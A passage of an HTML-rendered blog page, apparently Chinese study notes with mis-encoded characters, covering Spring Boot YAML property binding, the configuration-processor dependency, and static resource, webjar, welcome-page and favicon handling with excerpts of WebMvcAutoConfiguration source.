class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> Boolean boss;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> Pet pet;<br>    <span class="hljs-keyword">private</span> String[] interests;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; animal;<br>    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; score;<br>    <span class="hljs-keyword">private</span> Set&lt;Double&gt; salarys;<br>    <span class="hljs-keyword">private</span> Map&lt;String, List&lt;Pet&gt;&gt; allPets;<br>&#125;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Double weight;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨yamlè¡¨ç¤ºä»¥ä¸Šå¯¹è±¡</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">userName:</span> <span class="hljs-string">zhangsan</span><br>  <span class="hljs-attr">boss:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">birth:</span> <span class="hljs-number">2019</span><span class="hljs-string">/12/12</span> <span class="hljs-number">20</span><span class="hljs-string">:12:33</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">18</span><br>  <span class="hljs-attr">pet:</span> <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">tomcat</span><br>    <span class="hljs-attr">weight:</span> <span class="hljs-number">23.4</span><br>  <span class="hljs-attr">interests:</span> [<span class="hljs-string">ç¯®çƒ</span>,<span class="hljs-string">æ¸¸æ³³</span>]<br>  <span class="hljs-attr">animal:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">jerry</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">mario</span><br>  <span class="hljs-attr">score:</span><br>    <span class="hljs-attr">english:</span> <br>      <span class="hljs-attr">first:</span> <span class="hljs-number">30</span><br>      <span class="hljs-attr">second:</span> <span class="hljs-number">40</span><br>      <span class="hljs-attr">third:</span> <span class="hljs-number">50</span><br>    <span class="hljs-attr">math:</span> [<span class="hljs-number">131</span>,<span class="hljs-number">140</span>,<span class="hljs-number">148</span>]<br>    <span class="hljs-attr">chinese:</span> &#123;<span class="hljs-attr">first:</span> <span class="hljs-number">128</span>,<span class="hljs-attr">second:</span> <span class="hljs-number">136</span>&#125;<br>  <span class="hljs-attr">salarys:</span> [<span class="hljs-number">3999</span>,<span class="hljs-number">4999.98</span>,<span class="hljs-number">5999.99</span>]<br>  <span class="hljs-attr">allPets:</span><br>    <span class="hljs-attr">sick:</span><br>      <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">tom</span>&#125;<br>      <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">jerry</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">47</span>&#125;<br>    <span class="hljs-attr">health:</span> [&#123;<span class="hljs-attr">name:</span> <span class="hljs-string">mario</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">47</span>&#125;]<br></code></pre></td></tr></table></figure><h2 id="21ã€é…ç½®æ–‡ä»¶-è‡ªå®šä¹‰ç±»ç»‘å®šçš„é…ç½®æç¤º"><a href="#21ã€é…ç½®æ–‡ä»¶-è‡ªå®šä¹‰ç±»ç»‘å®šçš„é…ç½®æç¤º" class="headerlink" title="21ã€é…ç½®æ–‡ä»¶-è‡ªå®šä¹‰ç±»ç»‘å®šçš„é…ç½®æç¤º"></a>21ã€é…ç½®æ–‡ä»¶-è‡ªå®šä¹‰ç±»ç»‘å®šçš„é…ç½®æç¤º</h2><blockquote><p>You can easily generate your own configuration metadata file from items annotated with <code>@ConfigurationProperties</code> by using the <code>spring-boot-configuration-processor</code> jar. The jar includes a Java annotation processor which is invoked as your project is compiled.â€”â€”<a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#configuration-metadata-annotation-processor">link</a></p></blockquote><p>è‡ªå®šä¹‰çš„ç±»å’Œé…ç½®æ–‡ä»¶ç»‘å®šä¸€èˆ¬æ²¡æœ‰æç¤ºã€‚è‹¥è¦æç¤ºï¼Œæ·»åŠ å¦‚ä¸‹ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- ä¸‹é¢æ’ä»¶ä½œç”¨æ˜¯å·¥ç¨‹æ‰“åŒ…æ—¶ï¼Œä¸å°†spring-boot-configuration-processoræ‰“è¿›åŒ…å†…ï¼Œè®©å…¶åªåœ¨ç¼–ç çš„æ—¶å€™æœ‰ç”¨ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="22ã€webåœºæ™¯-webå¼€å‘ç®€ä»‹"><a href="#22ã€webåœºæ™¯-webå¼€å‘ç®€ä»‹" class="headerlink" title="22ã€webåœºæ™¯-webå¼€å‘ç®€ä»‹"></a>22ã€webåœºæ™¯-webå¼€å‘ç®€ä»‹</h2><p>Spring Boot provides auto-configuration for Spring MVC that <strong>works well with most applications.(å¤§å¤šåœºæ™¯æˆ‘ä»¬éƒ½æ— éœ€è‡ªå®šä¹‰é…ç½®)</strong></p><p>The auto-configuration adds the following features on top of Springâ€™s defaults:</p><ul><li><p>Inclusion of <code>ContentNegotiatingViewResolver</code> and <code>BeanNameViewResolver</code> beans.</p><ul><li>å†…å®¹åå•†è§†å›¾è§£æå™¨å’ŒBeanNameè§†å›¾è§£æå™¨</li></ul></li><li><p>Support for serving static resources, including support for WebJars (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-static-content">later in this document</a>)).</p><ul><li>é™æ€èµ„æºï¼ˆåŒ…æ‹¬webjarsï¼‰</li></ul></li><li><p>Automatic registration of <code>Converter</code>, <code>GenericConverter</code>, and <code>Formatter</code> beans.</p><ul><li>è‡ªåŠ¨æ³¨å†Œ <code>Converterï¼ŒGenericConverterï¼ŒFormatter </code></li></ul></li><li><p>Support for <code>HttpMessageConverters</code> (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-message-converters">later in this document</a>).</p><ul><li>æ”¯æŒ <code>HttpMessageConverters</code> ï¼ˆåæ¥æˆ‘ä»¬é…åˆå†…å®¹åå•†ç†è§£åŸç†ï¼‰</li></ul></li><li><p>Automatic registration of <code>MessageCodesResolver</code> (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-message-codes">later in this document</a>).</p><ul><li>è‡ªåŠ¨æ³¨å†Œ <code>MessageCodesResolver</code> ï¼ˆå›½é™…åŒ–ç”¨ï¼‰</li></ul></li><li><p>Static <code>index.html</code> support.</p><ul><li>é™æ€index.html é¡µæ”¯æŒ</li></ul></li><li><p>Custom <code>Favicon</code> support (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-favicon">later in this document</a>).</p><ul><li>è‡ªå®šä¹‰ <code>Favicon</code></li></ul></li><li><p>Automatic use of a <code>ConfigurableWebBindingInitializer</code> bean (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-web-binding-initializer">later in this document</a>).</p><ul><li>è‡ªåŠ¨ä½¿ç”¨ <code>ConfigurableWebBindingInitializer</code> ï¼Œï¼ˆDataBinderè´Ÿè´£å°†è¯·æ±‚æ•°æ®ç»‘å®šåˆ°JavaBeanä¸Šï¼‰</li></ul></li></ul><blockquote><p>If you want to keep those Spring Boot MVC customizations and make more <a href="https://docs.spring.io/spring/docs/5.2.9.RELEASE/spring-framework-reference/web.html#mvc">MVC customizations</a> (interceptors, formatters, view controllers, and other features), you can add your own <code>@Configuration</code> class of type <code>WebMvcConfigurer</code> but <strong>without</strong> <code>@EnableWebMvc</code>.</p><p><strong>ä¸ç”¨@EnableWebMvcæ³¨è§£ã€‚ä½¿ç”¨</strong> <strong><code>@Configuration</code></strong> <strong>+</strong> <strong><code>WebMvcConfigurer</code></strong> <strong>è‡ªå®šä¹‰è§„åˆ™</strong></p></blockquote><blockquote><p>If you want to provide custom instances of <code>RequestMappingHandlerMapping</code>, <code>RequestMappingHandlerAdapter</code>, or <code>ExceptionHandlerExceptionResolver</code>, and still keep the Spring Boot MVC customizations, you can declare a bean of type <code>WebMvcRegistrations</code> and use it to provide custom instances of those components.</p><p><strong>å£°æ˜</strong> <strong><code>WebMvcRegistrations</code></strong> <strong>æ”¹å˜é»˜è®¤åº•å±‚ç»„ä»¶</strong></p></blockquote><blockquote><p>If you want to take complete control of Spring MVC, you can add your own <code>@Configuration</code> annotated with <code>@EnableWebMvc</code>, or alternatively add your own <code>@Configuration</code>-annotated <code>DelegatingWebMvcConfiguration</code> as described in the Javadoc of <code>@EnableWebMvc</code>.</p><p><strong>ä½¿ç”¨</strong> <strong><code>@EnableWebMvc+@Configuration+DelegatingWebMvcConfiguration å…¨é¢æ¥ç®¡SpringMVC</code></strong></p></blockquote><h2 id="23ã€webåœºæ™¯-é™æ€èµ„æºè§„åˆ™ä¸å®šåˆ¶åŒ–"><a href="#23ã€webåœºæ™¯-é™æ€èµ„æºè§„åˆ™ä¸å®šåˆ¶åŒ–" class="headerlink" title="23ã€webåœºæ™¯-é™æ€èµ„æºè§„åˆ™ä¸å®šåˆ¶åŒ–"></a>23ã€webåœºæ™¯-é™æ€èµ„æºè§„åˆ™ä¸å®šåˆ¶åŒ–</h2><h3 id="é™æ€èµ„æºç›®å½•"><a href="#é™æ€èµ„æºç›®å½•" class="headerlink" title="é™æ€èµ„æºç›®å½•"></a>é™æ€èµ„æºç›®å½•</h3><p>åªè¦é™æ€èµ„æºæ”¾åœ¨ç±»è·¯å¾„ä¸‹ï¼š called <code>/static</code> (or <code>/public</code> or <code>/resources</code> or <code>/META-INF/resources</code></p><p>è®¿é—® ï¼š å½“å‰é¡¹ç›®æ ¹è·¯å¾„&#x2F; + é™æ€èµ„æºå </p><p>åŸç†ï¼š é™æ€æ˜ å°„&#x2F;**ã€‚</p><p>è¯·æ±‚è¿›æ¥ï¼Œå…ˆå»æ‰¾Controllerçœ‹èƒ½ä¸èƒ½å¤„ç†ã€‚ä¸èƒ½å¤„ç†çš„æ‰€æœ‰è¯·æ±‚åˆéƒ½äº¤ç»™é™æ€èµ„æºå¤„ç†å™¨ã€‚é™æ€èµ„æºä¹Ÿæ‰¾ä¸åˆ°åˆ™å“åº”404é¡µé¢ã€‚</p><p>ä¹Ÿå¯ä»¥æ”¹å˜é»˜è®¤çš„é™æ€èµ„æºè·¯å¾„ï¼Œ<code>/static</code>ï¼Œ<code>/public</code>,<code>/resources</code>, <code>/META-INF/resources</code>å¤±æ•ˆ</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">resources:</span><br>  <span class="hljs-attr">static-locations:</span> [<span class="hljs-string">classpath:/haha/</span>]<br></code></pre></td></tr></table></figure><h3 id="é™æ€èµ„æºè®¿é—®å‰ç¼€"><a href="#é™æ€èµ„æºè®¿é—®å‰ç¼€" class="headerlink" title="é™æ€èµ„æºè®¿é—®å‰ç¼€"></a>é™æ€èµ„æºè®¿é—®å‰ç¼€</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">static-path-pattern:</span> <span class="hljs-string">/res/**</span><br></code></pre></td></tr></table></figure><p>å½“å‰é¡¹ç›® + static-path-pattern + é™æ€èµ„æºå &#x3D; é™æ€èµ„æºæ–‡ä»¶å¤¹ä¸‹æ‰¾</p><h3 id="webjar"><a href="#webjar" class="headerlink" title="webjar"></a>webjar</h3><p>å¯ç”¨jaræ–¹å¼æ·»åŠ cssï¼Œjsç­‰èµ„æºæ–‡ä»¶ï¼Œ</p><p><a href="https://www.webjars.org/">https://www.webjars.org/</a></p><p>ä¾‹å¦‚ï¼Œæ·»åŠ jquery</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jquery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®åœ°å€ï¼š<a href="http://localhost:8080/webjars/jquery/3.5.1/jquery.js">http://localhost:8080/webjars/<strong>jquery&#x2F;3.5.1&#x2F;jquery.js</strong></a>  åé¢åœ°å€è¦æŒ‰ç…§ä¾èµ–é‡Œé¢çš„åŒ…è·¯å¾„ã€‚</p><h2 id="24ã€webåœºæ™¯-welcomeä¸faviconåŠŸèƒ½"><a href="#24ã€webåœºæ™¯-welcomeä¸faviconåŠŸèƒ½" class="headerlink" title="24ã€webåœºæ™¯-welcomeä¸faviconåŠŸèƒ½"></a>24ã€webåœºæ™¯-welcomeä¸faviconåŠŸèƒ½</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/htmlsingle/#boot-features-spring-mvc-welcome-page">å®˜æ–¹æ–‡æ¡£</a></p><h3 id="æ¬¢è¿é¡µæ”¯æŒ"><a href="#æ¬¢è¿é¡µæ”¯æŒ" class="headerlink" title="æ¬¢è¿é¡µæ”¯æŒ"></a>æ¬¢è¿é¡µæ”¯æŒ</h3><ul><li><p>é™æ€èµ„æºè·¯å¾„ä¸‹  index.htmlã€‚</p><ul><li>å¯ä»¥é…ç½®é™æ€èµ„æºè·¯å¾„</li><li>ä½†æ˜¯ä¸å¯ä»¥é…ç½®é™æ€èµ„æºçš„è®¿é—®å‰ç¼€ã€‚å¦åˆ™å¯¼è‡´ index.htmlä¸èƒ½è¢«é»˜è®¤è®¿é—®</li></ul></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br><span class="hljs-comment">#  mvc:</span><br><span class="hljs-comment">#    static-path-pattern: /res/**   è¿™ä¸ªä¼šå¯¼è‡´welcome pageåŠŸèƒ½å¤±æ•ˆ</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">static-locations:</span> [<span class="hljs-string">classpath:/haha/</span>]<br></code></pre></td></tr></table></figure><ul><li>controllerèƒ½å¤„ç†&#x2F;indexã€‚</li></ul><h3 id="è‡ªå®šä¹‰Favicon"><a href="#è‡ªå®šä¹‰Favicon" class="headerlink" title="è‡ªå®šä¹‰Favicon"></a>è‡ªå®šä¹‰Favicon</h3><p>æŒ‡ç½‘é¡µæ ‡ç­¾ä¸Šçš„å°å›¾æ ‡ã€‚</p><p>favicon.ico æ”¾åœ¨é™æ€èµ„æºç›®å½•ä¸‹å³å¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br><span class="hljs-comment">#  mvc:</span><br><span class="hljs-comment">#    static-path-pattern: /res/**   è¿™ä¸ªä¼šå¯¼è‡´ Favicon åŠŸèƒ½å¤±æ•ˆ</span><br></code></pre></td></tr></table></figure><h2 id="25ã€webåœºæ™¯-ã€æºç åˆ†æã€‘-é™æ€èµ„æºåŸç†"><a href="#25ã€webåœºæ™¯-ã€æºç åˆ†æã€‘-é™æ€èµ„æºåŸç†" class="headerlink" title="25ã€webåœºæ™¯-ã€æºç åˆ†æã€‘-é™æ€èµ„æºåŸç†"></a>25ã€webåœºæ™¯-ã€æºç åˆ†æã€‘-é™æ€èµ„æºåŸç†</h2><ul><li>SpringBootå¯åŠ¨é»˜è®¤åŠ è½½  xxxAutoConfiguration ç±»ï¼ˆè‡ªåŠ¨é…ç½®ç±»ï¼‰</li><li>SpringMVCåŠŸèƒ½çš„è‡ªåŠ¨é…ç½®ç±»<code>WebMvcAutoConfiguration</code>ï¼Œç”Ÿæ•ˆ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurer.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span><br><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, TaskExecutionAutoConfiguration.class,</span><br><span class="hljs-meta">ValidationAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç»™å®¹å™¨ä¸­é…ç½®çš„å†…å®¹ï¼š<ul><li>é…ç½®æ–‡ä»¶çš„ç›¸å…³å±æ€§çš„ç»‘å®šï¼šWebMvcProperties&#x3D;&#x3D;<strong>spring.mvc</strong>ã€ResourceProperties&#x3D;&#x3D;<strong>spring.resources</strong></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@Import(EnableWebMvcConfiguration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123; WebMvcProperties.class, ResourceProperties.class &#125;)</span><br><span class="hljs-meta">@Order(0)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfigurationAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é…ç½®ç±»åªæœ‰ä¸€ä¸ªæœ‰å‚æ„é€ å™¨"><a href="#é…ç½®ç±»åªæœ‰ä¸€ä¸ªæœ‰å‚æ„é€ å™¨" class="headerlink" title="é…ç½®ç±»åªæœ‰ä¸€ä¸ªæœ‰å‚æ„é€ å™¨"></a>é…ç½®ç±»åªæœ‰ä¸€ä¸ªæœ‰å‚æ„é€ å™¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">////æœ‰å‚æ„é€ å™¨æ‰€æœ‰å‚æ•°çš„å€¼éƒ½ä¼šä»å®¹å™¨ä¸­ç¡®å®š</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">WebMvcAutoConfigurationAdapter</span><span class="hljs-params">(WebProperties webProperties, WebMvcProperties mvcProperties,</span><br><span class="hljs-params">ListableBeanFactory beanFactory, ObjectProvider&lt;HttpMessageConverters&gt; messageConvertersProvider,</span><br><span class="hljs-params">ObjectProvider&lt;ResourceHandlerRegistrationCustomizer&gt; resourceHandlerRegistrationCustomizerProvider,</span><br><span class="hljs-params">ObjectProvider&lt;DispatcherServletPath&gt; dispatcherServletPath,</span><br><span class="hljs-params">ObjectProvider&lt;ServletRegistrationBean&lt;?&gt;&gt; servletRegistrations)</span> &#123;<br><span class="hljs-built_in">this</span>.mvcProperties = mvcProperties;<br><span class="hljs-built_in">this</span>.beanFactory = beanFactory;<br><span class="hljs-built_in">this</span>.messageConvertersProvider = messageConvertersProvider;<br><span class="hljs-built_in">this</span>.resourceHandlerRegistrationCustomizer = resourceHandlerRegistrationCustomizerProvider.getIfAvailable();<br><span class="hljs-built_in">this</span>.dispatcherServletPath = dispatcherServletPath;<br><span class="hljs-built_in">this</span>.servletRegistrations = servletRegistrations;<br><span class="hljs-built_in">this</span>.mvcProperties.checkConfiguration();<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ResourceProperties resourcePropertiesï¼›è·å–å’Œspring.resourcesç»‘å®šçš„æ‰€æœ‰çš„å€¼çš„å¯¹è±¡</li><li>WebMvcProperties mvcProperties è·å–å’Œspring.mvcç»‘å®šçš„æ‰€æœ‰çš„å€¼çš„å¯¹è±¡</li><li>ListableBeanFactory beanFactory Springçš„beanFactory</li><li>HttpMessageConverters æ‰¾åˆ°æ‰€æœ‰çš„HttpMessageConverters</li><li>ResourceHandlerRegistrationCustomizer æ‰¾åˆ° èµ„æºå¤„ç†å™¨çš„è‡ªå®šä¹‰å™¨ã€‚</li><li>DispatcherServletPath</li><li>ServletRegistrationBean   ç»™åº”ç”¨æ³¨å†ŒServletã€Filterâ€¦.</li></ul><h3 id="èµ„æºå¤„ç†çš„é»˜è®¤è§„åˆ™"><a href="#èµ„æºå¤„ç†çš„é»˜è®¤è§„åˆ™" class="headerlink" title="èµ„æºå¤„ç†çš„é»˜è®¤è§„åˆ™"></a>èµ„æºå¤„ç†çš„é»˜è®¤è§„åˆ™</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnableWebMvcConfiguration</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DelegatingWebMvcConfiguration</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResourceLoaderAware</span> &#123;<br>        ...<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;<br><span class="hljs-built_in">super</span>.addResourceHandlers(registry);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resourceProperties.isAddMappings()) &#123;<br>logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> getServletContext();<br>addResourceHandler(registry, <span class="hljs-string">&quot;/webjars/**&quot;</span>, <span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);<br>addResourceHandler(registry, <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern(), (registration) -&gt; &#123;<br>registration.addResourceLocations(<span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations());<br><span class="hljs-keyword">if</span> (servletContext != <span class="hljs-literal">null</span>) &#123;<br>registration.addResourceLocations(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(servletContext, SERVLET_LOCATION));<br>&#125;<br>&#125;);<br>&#125;<br>        ...<br>        <br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šè¿°ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥åŒè¿‡é…ç½®ç¦æ­¢æ‰€æœ‰é™æ€èµ„æºè§„åˆ™ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">add-mappings:</span> <span class="hljs-literal">false</span>   <span 